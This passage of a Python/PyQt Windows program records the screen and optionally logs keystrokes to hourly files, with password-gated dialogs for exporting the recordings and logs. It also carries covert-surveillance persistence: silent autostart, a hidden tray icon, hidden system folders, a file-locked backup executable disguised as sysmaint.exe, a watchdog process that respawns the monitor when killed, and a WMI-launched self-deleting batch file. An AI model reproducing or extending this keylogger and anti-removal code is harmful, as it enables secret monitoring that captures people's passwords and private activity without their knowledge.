        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        line = f"[{ts}] {event_type}: {content}"
        with self._lock:
            self.buffer.append(line)
            need = len(self.buffer) >= 20
        if need:
            self._flush()

    def _get_file_path(self):
        now = datetime.now()
        hour_key = now.strftime("%Y%m%d_%H")
        if hour_key != self.current_hour:
            self.current_hour = hour_key
            self.current_file_path = os.path.join(self.store_dir, f"k_{hour_key}.db")
        return self.current_file_path

    def _flush(self):
        with self._lock:
            if not self.buffer:
                return
            lines = self.buffer[:]
            self.buffer = []
        try:
            os.makedirs(self.store_dir, exist_ok=True)
            with open(self._get_file_path(), 'a', encoding="utf-8") as f:
                f.write("\n".join(lines) + "\n")
        except Exception as e:
            log(f"输入记录写入失败: {e}")
            with self._lock:
                self.buffer = lines + self.buffer

    def list_log_files(self):
        files = []
        try:
            for f in os.listdir(self.store_dir):
                if f.startswith("k_") and f.endswith(".db"):
                    fp = os.path.join(self.store_dir, f)
                    files.append({
                        "file": f,
                        "size": os.path.getsize(fp),
                        "time": datetime.fromtimestamp(os.path.getmtime(fp)).strftime("%Y-%m-%d %H:%M"),
                        "name": f"输入记录_{f[2:-3]}.txt"
                    })
        except Exception:
            pass
        return sorted(files, key=lambda x: x["file"], reverse=True)

    def export_log(self, entry, dest_dir):
        dest = os.path.join(dest_dir, entry["name"])
        shutil.copy2(os.path.join(self.store_dir, entry["file"]), dest)
        return dest


# ============================================================
# 视频管理对话框
# ============================================================
class VideoManageDialog(QMainWindow):
    def __init__(self, video_store, config):
        super().__init__()
        self.store = video_store
        self.config = config
        self.setWindowTitle(APP_NAME + " - 片段管理")
        self.resize(720, 500)
        self.setMinimumSize(560, 400)
        w = QWidget()
        self.setCentralWidget(w)
        lay = QVBoxLayout(w)

        top = QHBoxLayout()
        for text, slot, width in [("全选", self._select_all, 60), ("取消全选", self._deselect_all, 90)]:
            b = QPushButton(text); b.setFixedWidth(width); b.clicked.connect(slot); top.addWidget(b)
        top.addStretch(); lay.addLayout(top)

        self.tree = QTreeWidget()
        self.tree.setHeaderLabels(["时间", "时长", "大小", "文件名"])
        self.tree.setRootIsDecorated(False)
        self.tree.setSelectionMode(QAbstractItemView.ExtendedSelection)
        self.tree.header().setSectionResizeMode(0, QHeaderView.Stretch)
        self.tree.header().setSectionResizeMode(1, QHeaderView.ResizeToContents)
        self.tree.header().setSectionResizeMode(2, QHeaderView.ResizeToContents)
        self.tree.header().setSectionResizeMode(3, QHeaderView.Stretch)
        lay.addWidget(self.tree)

        btn_lay = QHBoxLayout()
        self.btn_play = QPushButton("播放（需密码）"); self.btn_play.clicked.connect(self._play)
        self.btn_export = QPushButton("批量导出（需密码）"); self.btn_export.clicked.connect(self._export)
        self.btn_del = QPushButton("批量删除（需密码）"); self.btn_del.setStyleSheet("color:#d33;")
        self.btn_del.clicked.connect(self._delete)
        self.btn_refresh = QPushButton("刷新"); self.btn_refresh.clicked.connect(self._refresh)
        for b in [self.btn_play, self.btn_export, self.btn_del, self.btn_refresh]:
            btn_lay.addWidget(b)
        btn_lay.addStretch(); lay.addLayout(btn_lay)
        self._refresh()

    def _select_all(self): self.tree.selectAll()
    def _deselect_all(self): self.tree.clearSelection()

    def _refresh(self):
        self.tree.clear()
        for e in self.store.list_videos():
            item = QTreeWidgetItem([e.get("time", ""), f"{e.get('duration', 0)}分钟",
                                    f"{e.get('size', 0)//1024//1024}MB", e.get("name", "")])
            item.setData(0, Qt.UserRole, e)
            self.tree.addTopLevelItem(item)

    def _selected(self):
        items = self.tree.selectedItems()
        if not items:
            QMessageBox.information(self, "提示", "请先选择项目")
            return []
        return [it.data(0, Qt.UserRole) for it in items]

    def _verify(self):
        pwd, ok = prompt_password(self)
        if not ok:
            return False
        if not verify_password(pwd, self.config.get("password_hash", ""), self.config.get("password_salt", "")):
            QMessageBox.warning(self, "错误", "密码不正确")
            return False
        return True

    def _play(self):
        sel = self._selected()
        if not sel or not self._verify():
            return
        try:
            self.store.play_video(sel[0])
            QMessageBox.information(self, "提示", "已打开（临时副本，退出后清理）")
        except Exception as ex:
            QMessageBox.warning(self, "错误", f"播放失败: {ex}")

    def _export(self):
        sel = self._selected()
        if not sel or not self._verify():
            return
        dest = QFileDialog.getExistingDirectory(self, "选择导出位置")
        if not dest:
            return
        ok = 0
        for e in sel:
            try:
                self.store.export_video(e, dest)
                ok += 1
            except Exception:
                pass
        QMessageBox.information(self, "完成", f"已导出 {ok}/{len(sel)} 个片段到：\n{dest}")

    def _delete(self):
        sel = self._selected()
        if not sel or not self._verify():
            return
        if QMessageBox.question(self, "确认", f"确定删除选中的 {len(sel)} 个片段？不可恢复！",
                                QMessageBox.Yes | QMessageBox.No) != QMessageBox.Yes:
            return
        n = sum(1 for e in sel if self.store.delete_video(e))
        QMessageBox.information(self, "完成", f"已删除 {n} 个片段")
        self._refresh()


# ============================================================
# 输入记录管理对话框
# ============================================================
class KeyLogManageDialog(QMainWindow):
    def __init__(self, keylogger, config):
        super().__init__()
        self.kl = keylogger
        self.config = config
        self.setWindowTitle(APP_NAME + " - 输入记录")
        self.resize(600, 450)
        self.setMinimumSize(480, 350)
        w = QWidget(); self.setCentralWidget(w); lay = QVBoxLayout(w)

        top = QHBoxLayout()
        for text, slot, width in [("全选", self._select_all, 60), ("取消全选", self._deselect_all, 90)]:
            b = QPushButton(text); b.setFixedWidth(width); b.clicked.connect(slot); top.addWidget(b)
        top.addStretch(); lay.addLayout(top)

        self.tree = QTreeWidget()
        self.tree.setHeaderLabels(["日期时间", "大小", "文件名"])
        self.tree.setRootIsDecorated(False)
        self.tree.setSelectionMode(QAbstractItemView.ExtendedSelection)
        self.tree.header().setSectionResizeMode(0, QHeaderView.Stretch)
        self.tree.header().setSectionResizeMode(1, QHeaderView.ResizeToContents)
        self.tree.header().setSectionResizeMode(2, QHeaderView.Stretch)
        lay.addWidget(self.tree)

        btn_lay = QHBoxLayout()
        self.btn_view = QPushButton("查看"); self.btn_view.clicked.connect(self._view)
        self.btn_export = QPushButton("批量导出TXT（需密码）"); self.btn_export.clicked.connect(self._export)
        self.btn_del = QPushButton("批量删除（需密码）"); self.btn_del.setStyleSheet("color:#d33;")
        self.btn_del.clicked.connect(self._delete)
        self.btn_refresh = QPushButton("刷新"); self.btn_refresh.clicked.connect(self._refresh)
        for b in [self.btn_view, self.btn_export, self.btn_del, self.btn_refresh]:
            btn_lay.addWidget(b)
        btn_lay.addStretch(); lay.addLayout(btn_lay)
        self._refresh()

    def _select_all(self): self.tree.selectAll()
    def _deselect_all(self): self.tree.clearSelection()

    def _refresh(self):
        self.tree.clear()
        for e in self.kl.list_log_files():
            item = QTreeWidgetItem([e.get("time", ""), f"{e.get('size', 0)//1024}KB", e.get("name", "")])
            item.setData(0, Qt.UserRole, e)
            self.tree.addTopLevelItem(item)

    def _selected(self):
        items = self.tree.selectedItems()
        if not items:
            QMessageBox.information(self, "提示", "请先选择记录")
            return []
        return [it.data(0, Qt.UserRole) for it in items]

    def _verify(self):
        pwd, ok = prompt_password(self)
        if not ok:
            return False
        if not verify_password(pwd, self.config.get("password_hash", ""), self.config.get("password_salt", "")):
            QMessageBox.warning(self, "错误", "密码不正确")
            return False
        return True

    def _view(self):
        sel = self._selected()
        if not sel:
            return
        try:
            with open(os.path.join(self.kl.store_dir, sel[0]["file"]), 'r', encoding="utf-8") as f:
                content = f.read()
            vw = QMainWindow(); vw.setWindowTitle(sel[0]["name"]); vw.resize(600, 500)
            te = QTextEdit(); te.setReadOnly(True); te.setPlainText(content)
            vw.setCentralWidget(te); vw.show(); self._vw = vw
        except Exception as ex:
            QMessageBox.warning(self, "错误", f"读取失败: {ex}")

    def _export(self):
        sel = self._selected()
        if not sel or not self._verify():
            return
        dest = QFileDialog.getExistingDirectory(self, "选择导出位置")
        if not dest:
            return
        for e in sel:
            try: self.kl.export_log(e, dest)
            except Exception: pass
        QMessageBox.information(self, "完成", f"已导出 {len(sel)} 个记录")

    def _delete(self):
        sel = self._selected()
        if not sel or not self._verify():
            return
        if QMessageBox.question(self, "确认", f"确定删除选中的 {len(sel)} 个记录？不可恢复！",
                                QMessageBox.Yes | QMessageBox.No) != QMessageBox.Yes:
            return
        n = 0
        for e in sel:
            p = os.path.join(self.kl.store_dir, e["file"])
            if os.path.exists(p) and force_remove(p):
                n += 1
        QMessageBox.information(self, "完成", f"已删除 {n} 个记录")
        self._refresh()


# ============================================================
# 设置窗口
# ============================================================
class SettingsWindow(QMainWindow):
    def __init__(self, config, video_store, on_save=None, on_uninstall=None, on_stop=None):
        super().__init__()
        self.config = config
        self.store = video_store
        self.on_save = on_save
        self.on_uninstall = on_uninstall
        self.on_stop = on_stop
        self.setWindowTitle(APP_NAME + " - 设置")
        screen = QApplication.primaryScreen().availableGeometry()
        self.resize(560, min(800, int(screen.height() * 0.9)))
        self.setMinimumSize(480, 500)
        self._init_ui()

    def _init_ui(self):
        central = QWidget(); self.setCentralWidget(central)
        outer = QVBoxLayout(central); outer.setContentsMargins(8, 8, 8, 8)
        scroll = QScrollArea(); scroll.setWidgetResizable(True)
        body = QWidget(); lay = QVBoxLayout(body); lay.setSpacing(8)

        g1 = QGroupBox("数据保存位置（实际文件隐藏在子目录 cache 中）")
        l1 = QHBoxLayout()
        self.path_label = QLabel(self.config.get("save_path") or "未设置"); self.path_label.setWordWrap(True)
        b = QPushButton("浏览..."); b.setFixedWidth(80); b.clicked.connect(self._browse)
        l1.addWidget(self.path_label, 1); l1.addWidget(b); g1.setLayout(l1); lay.addWidget(g1)

        g2 = QGroupBox("运行参数")
        l2 = QVBoxLayout()
        r1 = QHBoxLayout(); r1.addWidget(QLabel("帧率："))
        self.fps = QSpinBox(); self.fps.setRange(2, 30); self.fps.setValue(self.config.get("fps", 5))
        r1.addWidget(self.fps); r1.addWidget(QLabel("fps（5足够）")); r1.addStretch(); l2.addLayout(r1)
        r2 = QHBoxLayout(); r2.addWidget(QLabel("每段时长："))
        self.seg = QSpinBox(); self.seg.setRange(5, 180); self.seg.setValue(self.config.get("segment_minutes", 60))
        r2.addWidget(self.seg); r2.addWidget(QLabel("分钟")); r2.addStretch(); l2.addLayout(r2)
        r3 = QHBoxLayout(); r3.addWidget(QLabel("停止时间："))
        self.sh = QSpinBox(); self.sh.setRange(0, 23); self.sh.setValue(self.config.get("stop_hour", 17))
        r3.addWidget(self.sh); r3.addWidget(QLabel("时"))
        self.sm = QSpinBox(); self.sm.setRange(0, 59); self.sm.setValue(self.config.get("stop_minute", 45))
        r3.addWidget(self.sm); r3.addWidget(QLabel("分")); r3.addStretch(); l2.addLayout(r3)
        r4 = QHBoxLayout(); r4.addWidget(QLabel("录制宽度："))
        self.sw = QSpinBox(); self.sw.setRange(0, 3840); self.sw.setSingleStep(128); self.sw.setValue(self.config.get("scale_width", 1280))
        r4.addWidget(self.sw); r4.addWidget(QLabel("px（0=原始，1280=720p）")); r4.addStretch(); l2.addLayout(r4)
        r5 = QHBoxLayout(); r5.addWidget(QLabel("自动清理："))
        self.rt = QSpinBox(); self.rt.setRange(1, 30); self.rt.setValue(int(self.config.get("retention_days", 3)))
        r5.addWidget(self.rt); r5.addWidget(QLabel("天前的片段与输入记录（配置/密码永不清理）")); r5.addStretch(); l2.addLayout(r5)
        g2.setLayout(l2); lay.addWidget(g2)

        g3 = QGroupBox("安全防护")
        l3 = QVBoxLayout()
        self.auto = QCheckBox("开机自动静默运行"); self.auto.setChecked(self.config.get("autostart", True)); l3.addWidget(self.auto)
        self.hide_tray = QCheckBox("隐藏托盘图标（完全静默）"); self.hide_tray.setChecked(self.config.get("hide_tray", False)); l3.addWidget(self.hide_tray)
        self.hide_folder = QCheckBox("数据文件夹设为系统+隐藏"); self.hide_folder.setChecked(self.config.get("hide_folder", True)); l3.addWidget(self.hide_folder)
        self.watchdog = QCheckBox("防关闭保护（双进程互锁+每分钟看门狗）"); self.watchdog.setChecked(self.config.get("watchdog", False)); l3.addWidget(self.watchdog)
        self.keylog = QCheckBox("记录键盘输入（TXT：时间+事件+按键）"); self.keylog.setChecked(self.config.get("keylog", False)); l3.addWidget(self.keylog)

        btn_lay = QHBoxLayout()
        self.pwd_btn = QPushButton("修改密码"); self.pwd_btn.clicked.connect(self._change_pwd)
        self.vm_btn = QPushButton("片段管理"); self.vm_btn.clicked.connect(self._open_video_mgr)
        self.km_btn = QPushButton("输入记录"); self.km_btn.clicked.connect(self._open_keylog_mgr)
        for x in [self.pwd_btn, self.vm_btn, self.km_btn]: btn_lay.addWidget(x)
        btn_lay.addStretch(); l3.addLayout(btn_lay)

        sb = QPushButton("一键终止程序并取消开机自启"); sb.setStyleSheet("color:#e67e22;")
        sb.clicked.connect(self._full_stop)
        sr = QHBoxLayout(); sr.addWidget(sb); sr.addStretch(); l3.addLayout(sr)

        ub = QPushButton("卸载（需密码，停止防护并删除程序）"); ub.setStyleSheet("color:#d33;")
        ub.clicked.connect(self._uninstall)
        ur = QHBoxLayout(); ur.addWidget(ub); ur.addStretch(); l3.addLayout(ur)
        g3.setLayout(l3); lay.addWidget(g3); lay.addStretch()

        scroll.setWidget(body); outer.addWidget(scroll, 1)
        save_btn = QPushButton("保存并运行")
        save_btn.setMinimumHeight(42)
        save_btn.setStyleSheet("background-color:#2d8cf0;color:white;font-size:15px;border-radius:4px;font-weight:bold;")
        save_btn.clicked.connect(self._save); outer.addWidget(save_btn)

    def _browse(self):
        p = QFileDialog.getExistingDirectory(self, "选择数据保存文件夹")
        if p:
            self.path_label.setText(p)

    def _change_pwd(self):
        old, ok = prompt_password(self, "验证", "输入当前密码：")
        if not ok:
            return
        if not verify_password(old, self.config.get("password_hash", ""), self.config.get("password_salt", "")):
            QMessageBox.warning(self, "错误", "旧密码不正确"); return
        new, ok2 = QInputDialog.getText(self, "修改密码", "输入新密码：", QLineEdit.Password, "")
        if not ok2 or not new:
            return
        h, salt = hash_password(new)
        self.config["password_hash"] = h; self.config["password_salt"] = salt
        QMessageBox.information(self, "成功", "密码已修改，保存后生效")

    def _open_video_mgr(self):
        self.vm = VideoManageDialog(self.store, self.config); self.vm.show()

    def _open_keylog_mgr(self):
        self.km = KeyLogManageDialog(KeyboardLogger(self.store.store_dir), self.config); self.km.show()

    def _uninstall(self):
        pwd, ok = prompt_password(self, "验证", "输入密码确认卸载：")
        if not ok:
            return
        if not verify_password(pwd, self.config.get("password_hash", ""), self.config.get("password_salt", "")):
            QMessageBox.warning(self, "错误", "密码不正确"); return
        if QMessageBox.question(self, "确认卸载",
                                "将执行：\n1. 删除开机自启与看门狗任务\n"
                                "2. 结束主进程与守护进程（解除文件锁）\n"
                                "3. 删除程序本体、备份和配置\n\n"
                                "你的录制片段不会被删除。\n确定继续？",
                                QMessageBox.Yes | QMessageBox.No) != QMessageBox.Yes:
            return
        if run_uninstaller():
            QMessageBox.information(self, "完成", "卸载程序已启动，本窗口即将关闭，约5秒后完成。")
            QTimer.singleShot(800, QApplication.quit)

    def _full_stop(self):
        # 统一由 TrayController._full_stop 弹确认并执行（托盘菜单共用同一逻辑）
        if self.on_stop:
            self.on_stop()

    def _save(self):
        p = self.path_label.text()
        if not p or p == "未设置" or not os.path.isdir(p):
            QMessageBox.warning(self, "提示", "请选择有效的保存文件夹"); return
        self.config["save_path"] = p
        self.config["fps"] = self.fps.value()
        self.config["segment_minutes"] = self.seg.value()
        self.config["stop_hour"] = self.sh.value()
        self.config["stop_minute"] = self.sm.value()
        self.config["scale_width"] = self.sw.value()
        self.config["retention_days"] = self.rt.value()
        self.config["autostart"] = self.auto.isChecked()
        self.config["hide_tray"] = self.hide_tray.isChecked()
        self.config["hide_folder"] = self.hide_folder.isChecked()
        self.config["keylog"] = self.keylog.isChecked()
        self.config["watchdog"] = self.watchdog.isChecked()  # 任务由 on_save 统一校正
        if self.on_save:
            self.on_save(self.config)
        self.close()


# ============================================================
# 守护进程（无界面）：锁主exe + 主进程被杀后拉起
# ============================================================
class GuardController:
    def __init__(self):
        self.app = QCoreApplication.instance() or QCoreApplication(sys.argv)
        self.main_lock = FileLock(PRIMARY_EXE)
        self.last_spawn = 0
        self.timer = QTimer()
        self.timer.timeout.connect(self._tick)
        self.timer.start(5000)
        QTimer.singleShot(0, self._tick)
        log("守护进程已启动")

    def _tick(self):
        try:
            # 卸载、永久停用或当日停止：守护自行退出且不再拉起
            if uninstall_requested() or service_disabled() or pause_active():
                log("守护收到停止标志，退出")
                self.main_lock.release()
                self.app.quit()
                return
            # 主程序缺失则从备份（自身）恢复
            if not os.path.exists(PRIMARY_EXE):
                ensure_primary()
            # 持有主程序文件锁
            if not self.main_lock.locked:
                if self.main_lock.acquire():
                    log("守护已锁定主程序文件")
            # 主进程不存活且过了冷却期才拉起（避免 onefile 启动期重复拉起）
            if not event_exists(EVT_MAIN):
                now = time.time()
                if now - self.last_spawn >= SPAWN_COOLDOWN:
                    if ensure_primary():
                        log("检测到主进程未运行，拉起")
                        if spawn_detached(PRIMARY_EXE, ["--silent"]):
                            self.last_spawn = now
        except Exception as e:
            log(f"守护巡检异常: {e}")

    def run(self):
        self.app.exec()


def run_guard():
    # 单实例：已有守护立即退出
    token = AliveEvent(EVT_GUARD)
    if token.already_exists:
        return
    if not getattr(sys, 'frozen', False):
        log("非打包环境，守护进程退出")
        return
    # 卸载中、已永久停用或当天已停止：不启动守护
    if uninstall_requested() or service_disabled() or pause_active():
        log("守护启动时检测到停止标志，退出")
        return
    # 全局持有 token，防止被回收
    global _GUARD_TOKEN
    _GUARD_TOKEN = token
    GuardController().run()


_GUARD_TOKEN = None
_ROLE_TOKEN = None


# ============================================================
# 托盘控制器（主进程）
# ============================================================
class TrayController:
    def __init__(self, config):
        self.config = config
        self.app = QApplication.instance()
        self.recorder = None
        self.tray = None
        self.keylogger = None
        self.guard_lock = None
        self.main_event = None
        self.store = VideoStore(config["save_path"])
        log(f"初始化: tray={not config.get('hide_tray')}, watchdog={config.get('watchdog')}, keylog={config.get('keylog')}, PyAV={HAS_AV}")

        # 建立备份并锁定备份文件（备份因此无法被删除）
        ensure_backup()
        self.guard_lock = FileLock(BACKUP_EXE)
        if not self.guard_lock.acquire():
            QTimer.singleShot(2000, self._retry_lock_backup)

        # 拉起守护进程
        self._last_guard_spawn = 0
        self._ensure_guard()

        self._setup_ipc()
        if not config.get("hide_tray", False):
            self._build_tray()
        self._start_recording()
        if config.get("keylog", False):
            self.keylogger = KeyboardLogger(self.store.store_dir)
            self.keylogger.start()

        # 每5秒：互防 + 守护保活；每60秒重报任务计划
        self._tick_n = 0
        self.protect_timer = QTimer()
        self.protect_timer.timeout.connect(self._tick)
        self.protect_timer.start(5000)
        # 启动后立即按配置校正一次任务（修正被外部/旧版本错误创建的任务）
        QTimer.singleShot(3000, self._reconcile_tasks)

        # 保留期自动清理：启动15秒后执行一次，之后每小时一次（后台线程，不卡界面）
        self._retention_busy = False
        QTimer.singleShot(15000, self._retention_tick)
        self.retention_timer = QTimer()
        self.retention_timer.timeout.connect(self._retention_tick)
        self.retention_timer.start(3600 * 1000)

    def _retention_tick(self):
        if getattr(self, "_retention_busy", False):
            return
        self._retention_busy = True

        def job():
            try:
                run_retention(self.config, self.store)
            except Exception as e:
                log(f"保留期清理失败: {e}")
            finally:
                self._retention_busy = False

        threading.Thread(target=job, daemon=True).start()

    def _reconcile_tasks(self):
        try:
            reconcile_tasks(self.config)
        except Exception:
            pass

    def _retry_lock_backup(self):
        try:
            if self.guard_lock and not self.guard_lock.locked:
                ensure_backup()
                self.guard_lock.acquire()
        except Exception:
            pass

    def _ensure_guard(self):
        if not getattr(sys, 'frozen', False):
            return
        try:
            if not event_exists(EVT_GUARD):
                now = time.time()
                if now - self._last_guard_spawn >= SPAWN_COOLDOWN:
                    ensure_backup()
                    if spawn_detached(BACKUP_EXE, ["--guard"]):
                        self._last_guard_spawn = now
                        log("已拉起守护进程")
        except Exception as e:
            log(f"拉起守护失败: {e}")

    def _tick(self):
        # 卸载标志：立即退出，不再拉起任何进程
        if uninstall_requested():
            self._quit(write_pause=False)
            return
        # 永久停用：删除全部任务并结束（不再拉起守护）
        if service_disabled():
            try:
                _delete_task(TASK_AUTO); _delete_task(TASK_WATCH)
            except Exception:
                pass
            self._quit(write_pause=False)
            return
        self._tick_n += 1
        self_protect_files()
        self._ensure_guard()
        # 每60秒按配置校正任务计划（该建的补建、该关的删除）
        if self._tick_n % 12 == 0:
            self._reconcile_tasks()

    def _setup_ipc(self):
        self.server = QLocalServer()
        QLocalServer.removeServer(SOCKET_NAME)
        self.server.listen(SOCKET_NAME)
        self.server.newConnection.connect(self._on_ipc)

    def _on_ipc(self):
        client = self.server.nextPendingConnection()
        client.readyRead.connect(lambda: self._on_ipc_data(client))

    def _on_ipc_data(self, client):
        data = bytes(client.readAll()).decode("utf-8", errors="ignore")
        if data == "show_settings":
            self._settings()
        client.close()

    def _make_icon(self):
        pix = QPixmap(64, 64)
        pix.fill(QColor(70, 90, 120))
        p = QPainter(pix)
        p.setPen(QColor(220, 225, 235))
        f = p.font(); f.setBold(True); f.setPointSize(20); p.setFont(f)
        p.drawText(pix.rect(), Qt.AlignCenter, "M")
        p.end()
        return QIcon(pix)

    def _build_tray(self):
        self.tray = QSystemTrayIcon(self._make_icon())
        self.tray.setToolTip(APP_NAME)
        menu = QMenu()
        self.status_act = menu.addAction("状态：初始化..."); self.status_act.setEnabled(False)
        menu.addSeparator()
        self.stop_act = menu.addAction("停止"); self.stop_act.triggered.connect(self._stop)
        self.fullstop_act = menu.addAction("完全停止（取消开机自启）"); self.fullstop_act.triggered.connect(self._full_stop)
        menu.addAction("设置").triggered.connect(self._settings)
        menu.addAction("片段管理").triggered.connect(self._video_mgr)
        menu.addAction("输入记录").triggered.connect(self._keylog_mgr)
        menu.addAction("打开数据目录").triggered.connect(self._open_folder)
        menu.addSeparator()
        menu.addAction("退出").triggered.connect(self._quit)
        self.tray.setContextMenu(menu)
        self.tray.show()
        self.timer = QTimer(); self.timer.timeout.connect(self._check_time); self.timer.start(30000)

    def _open_folder(self):
        try:
            path = self.store.store_dir
            unset_hidden_system(path)
            os.startfile(path)
            QTimer.singleShot(3000, lambda: set_hidden_system(path))
        except Exception:
            pass

    def _start_recording(self):
        self.recorder = Recorder(self.config, self.store, on_status=self._on_status, on_file_saved=lambda e: None)
        self.recorder.start()

    def _on_status(self, s):
        if self.tray:
            self.status_act.setText(f"状态：{s}")

    def _stop(self):
        if self.recorder:
            self.recorder.stop()
        self.stop_act.setEnabled(False)

    def _full_stop(self):
        if QMessageBox.question(
                None, "一键终止",
                "将立即执行：\n1. 删除开机自启与看门狗任务\n"
                "2. 停止录制，结束主进程与守护进程\n\n"
                "此后开机不会再自动运行。\n以后想用时，双击本程序即可重新打开"
                "（需在设置里重新勾选“开机自动静默运行”）。\n\n确定现在终止？",
                QMessageBox.Yes | QMessageBox.No) != QMessageBox.Yes:
            return
        try:
            request_disable()              # 永久停用标志（不跨天失效）
            self.config["autostart"] = False
            self.config["watchdog"] = False
            save_config(self.config)
            _delete_task(TASK_AUTO)
            _delete_task(TASK_WATCH)
            if self.recorder:
                self.recorder.stop()
            if self.keylogger:
                self.keylogger.stop(); self.keylogger = None
            write_pause_flag()
            if self.guard_lock:
                self.guard_lock.release()
        except Exception as e:
            log(f"一键终止异常: {e}")
        kill_all_and_exit()

    def _verify_pwd(self):
        pwd, ok = prompt_password()
        if not ok:
            return False
        if not verify_password(pwd, self.config.get("password_hash", ""), self.config.get("password_salt", "")):
            QMessageBox.warning(None, "错误", "密码不正确")
            return False
        return True

    def _settings(self):
        if not self._verify_pwd():
            return
        self.win = SettingsWindow(self.config, self.store, on_save=self._on_save,
                                  on_uninstall=self._quit, on_stop=self._full_stop)
        self.win.show()

    def _video_mgr(self):
        if not self._verify_pwd():
            return
        self.vm = VideoManageDialog(self.store, self.config); self.vm.show()

    def _keylog_mgr(self):
        if not self._verify_pwd():
            return
        self.km = KeyLogManageDialog(KeyboardLogger(self.store.store_dir), self.config); self.km.show()

    def _on_save(self, config):
        self.config = config
        save_config(config)
        self._reconcile_tasks()
        if self.recorder:
            self.recorder.stop()
        self.store = VideoStore(config["save_path"])
        if config.get("hide_tray", False) and self.tray:
            self.tray.deleteLater(); self.tray = None
        elif not config.get("hide_tray", False) and not self.tray:
            self._build_tray()
        if self.tray:
            self.stop_act.setEnabled(True)
        self._start_recording()
        if self.keylogger:
            self.keylogger.stop(); self.keylogger = None
        if config.get("keylog", False):
            self.keylogger = KeyboardLogger(self.store.store_dir); self.keylogger.start()

    def _check_time(self):
        now = datetime.now()
        if (now.hour > self.config["stop_hour"] or
                (now.hour == self.config["stop_hour"] and now.minute >= self.config["stop_minute"])):
            if self.recorder and self.recorder.running:
                self.recorder.stop()
            if self.keylogger:
                self.keylogger.stop(); self.keylogger = None
            self.timer.stop()
            write_pause_flag()  # 当日停止，守护不再拉起
            QTimer.singleShot(5000, lambda: self._quit(write_pause=False))

    def _quit(self, write_pause=True):
        log("主进程退出")
        if write_pause:
            write_pause_flag()  # 手动退出：当天停止，守护同步退场
        try:
            self.protect_timer.stop()
        except Exception:
            pass
        if self.recorder:
            self.recorder.stop()
        if self.keylogger:
            self.keylogger.stop(); self.keylogger = None
        if self.tray:
            self.tray.deleteLater(); self.tray = None
        if self.guard_lock:
            self.guard_lock.release()
        if self.main_event:
            self.main_event.close()
        try:
            if hasattr(self, 'server'):
                self.server.close()
        except Exception:
            pass
        for f in _temp_files:
            try: os.remove(f)
            except Exception: pass
        self.app.quit()


def self_protect_files():
    """主进程：备份被删则重建（守护文件锁之外的第二保险）。"""
    if not getattr(sys, 'frozen', False):
        return
    try:
        cur = os.path.normpath(sys.executable)
        if cur != os.path.normpath(BACKUP_EXE) and not os.path.exists(BACKUP_EXE):
            os.makedirs(BACKUP_DIR, exist_ok=True)
            shutil.copy2(cur, BACKUP_EXE)
            set_hidden_system(BACKUP_DIR); set_hidden_system(BACKUP_EXE)
            log("备份被删，已重建")
    except Exception:
        pass


# ============================================================
# 卸载器（以临时改名副本运行，避免被 taskkill 误杀）
# ============================================================
def run_uninstaller():
    """从设置窗口调用：把自身复制到 TEMP 改名后以 --uninstall 运行。"""
    try:
        if not getattr(sys, 'frozen', False):
            return False
        tmp_exe = os.path.join(os.environ.get("TEMP", "."), "~msu" + uuid.uuid4().hex[:6] + ".exe")
        shutil.copy2(sys.executable, tmp_exe)
        spawn_detached(tmp_exe, ["--uninstall"])
        return True
    except Exception as e:
        log(f"启动卸载器失败: {e}")
        return False


def _count_named_processes():
    """用 tasklist 统计同名进程数量（不依赖命令行读取权限）。"""
    try:
        r = subprocess.run(['tasklist', '/FI', f'IMAGENAME eq {APP_EXE_NAME}', '/NH', '/FO', 'CSV'],
                           capture_output=True, text=True, creationflags=CREATE_NO_WINDOW)
        return r.stdout.count(APP_EXE_NAME)
    except Exception:
        return 0


def _spawn_self_delete(me):
    """生成独立批处理：等进程退出后循环删除自身 exe，再删除批处理本身。
    关键：优先通过 WMI 创建进程（父进程为 WmiPrvSE），脱离调用方作业对象，
    避免卸载器退出时子进程被作业连带结束；ShellExecute/直接启动作回退。"""
    bat = os.path.join(os.path.dirname(me), "~u" + uuid.uuid4().hex[:6] + ".cmd")
    try:
        with open(bat, 'w', encoding='mbcs', newline='\r\n') as f:
            f.write("@echo off\r\n:loop\r\n")
            f.write('del /f /q "%s" 2>nul\r\n' % me)
            f.write('if not exist "%s" goto done\r\n' % me)
            f.write("ping -n 2 127.0.0.1 >nul\r\ngoto loop\r\n:done\r\n")
            f.write('(goto) 2>nul & del /f /q "%~f0"\r\n')
    except Exception:
        bat = None

    # 0. 兜底保证：登记为“下次重启由系统删除”（提权卸载器下生效，不依赖孤儿进程）
    try:
        _k32.MoveFileExW(me, None, MOVEFILE_DELAY_UNTIL_REBOOT)
    except Exception:
        pass

    # 方式1：WMI 创建，进程挂到 WmiPrvSE 下，彻底脱离作业
    if bat:
        try:
            ps_cmd = ("Invoke-CimMethod -ClassName Win32_Process -MethodName Create "
                      "-Arguments @{ CommandLine = 'cmd.exe /c \"\"%s\"\"' } | Out-Null") % bat
            subprocess.Popen(['powershell.exe', '-NoProfile', '-WindowStyle', 'Hidden',
                              '-Command', ps_cmd],
                             creationflags=CREATE_NO_WINDOW, close_fds=True,
                             stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL)
            time.sleep(2)  # 等 WMI 调用完成，再让卸载器退出
            return
        except Exception:
            pass
        # 方式2：经 Shell（explorer）启动，脱离直接父子/作业关系
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "open", "cmd.exe", '/c "%s"' % bat, None, 0)  # SW_HIDE=0
            return
        except Exception:
            pass
        # 方式3：直接分离启动
        for fl in (DETACH_FLAGS, CREATE_NO_WINDOW):
            try:
                subprocess.Popen(['cmd', '/c', bat], creationflags=fl, close_fds=True,
                                 stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                                 stderr=subprocess.DEVNULL)
                return
            except Exception:
                continue


def uninstaller_main():
    """真正执行卸载（独立改名进程，自身不叫 sysmaint.exe 故不会被误杀）。"""
    log("卸载器开始执行")
    time.sleep(1)
    # 0. 置卸载标志：所有存活角色下一次巡检(<=5s)自行退出且不再拉起
    request_uninstall()
    # 1. 删任务计划
    _delete_task(TASK_AUTO)
    _delete_task(TASK_WATCH)
    # 2. 持续查杀：覆盖 onefile 解压启动期，连续3次(约3秒)无进程才算干净
    stable = 0
    for _ in range(40):
        subprocess.run(['taskkill', '/F', '/T', '/IM', APP_EXE_NAME],
                       capture_output=True, creationflags=CREATE_NO_WINDOW)
        time.sleep(1)
        if _count_named_processes() == 0:
            stable += 1
            if stable >= 3:
                break
        else:
            stable = 0
    time.sleep(2)
